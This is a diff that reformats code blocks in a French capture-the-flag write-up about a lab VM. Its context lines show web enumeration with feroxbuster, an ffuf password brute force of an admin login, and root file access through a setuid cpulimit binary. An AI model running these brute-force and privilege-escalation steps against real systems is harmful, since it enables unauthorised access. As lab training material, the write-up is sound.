@@ -31,7 +31,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Une énumération web est souvent une étape obligée dans les CTF :  
 
-```
+```console
 $ feroxbuster -u http://192.168.2.10/ -w raft-large-directories.txt -n -t 20
 
  ___  ___  __   __     __      __         __   ___
@@ -105,11 +105,11 @@ A priori il ne nous reste plus qu'à trouver une paire username / password valid
 
 J'ai utilisé *ffuf* pour la première fois sur cet usage bien précis et je me suis aperçu (d'abord via les résultats et après avec Wireshark) que ce dernier ne rajoute pas par défaut le bon content-type pour la requête. Il faut donc le spécifier quand on bruteforce un POST :  
 
-```bash
+```console
 $ ffuf -w rockyou.txt -X POST -d "username=contact@hacknos.com&password=FUZZ" -H "Content-type: application/x-www-form-urlencoded" -u http://192.168.2.10/websec/admin -fr Wrong
 ```
 
-Le filtre *-fr* permet d'exclure les pages qui auraient un certain pattern dans leur contenu.  
+Le filtre `-fr` permet d'exclure les pages qui auraient un certain pattern dans leur contenu.  
 
 J'ai fait de même avec *admin@hacknos.com* qu'il semblait réaliste d'essayer aussi.  
 
@@ -200,7 +200,7 @@ LinEnum me remonte un fichier Dockerfile sur le système qui correspond en fait 
 -rwxr-xr-x 1 www-data www-data 639 Jul 10  2019 /var/www/html/websec/Dockerfile
 ```
 
-```
+```docker
 FROM ubuntu:18.04
 
 RUN apt-get -y update
@@ -258,15 +258,15 @@ Ce dernier permet d'exécuter un programme tout en limitant d’emblée l'usage 
 
 Quelques exemples sont présents dans le manuel comme celui-ci :  
 
-```bash
+```console
 $ cpulimit -l 20 firefox
 Launch Firefox web browser and limit its CPU usage to 20%
 ```
 
 Si on appelle la commande *id* via *cpulimit* on obtient cet output :  
 
-```
-cpulimit -l 50 id
+```console
+$ cpulimit -l 50 id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 Process 7570 detected
 ```
@@ -275,7 +275,7 @@ Effectivement l'effective UID est root, ce qui est propre aux binaires setuid ma
 
 On peut toutefois profiter de cet effective UID pour passer les restrictions sur les fichiers :  
 
-```
+```console
 $ cpulimit -l 50 -- ls -al /root
 total 56
 drwx------  8 root root 4096 Dec 14  2019 .
